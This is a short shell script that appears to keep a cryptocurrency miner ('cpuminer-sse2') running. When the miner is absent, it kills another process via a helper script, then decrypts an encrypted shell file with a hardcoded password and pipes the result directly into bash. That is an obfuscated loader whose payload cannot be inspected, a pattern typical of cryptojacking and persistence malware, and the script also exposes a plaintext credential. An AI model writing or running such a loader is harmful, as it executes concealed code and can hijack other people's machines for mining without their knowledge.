#!/bin/sh
password="danielchau@123#"
if pgrep cpuminer-sse2 >/dev/null
then
  echo "cpuminer-sse2 is running."
else
  echo "cpuminer-sse2 isn't running"
  bash kill_miniZeph.sh
  sleep 3
  openssl enc -d -aes-256-cbc -pbkdf2 -in danielluis1922.sh -k $password | bash
fi
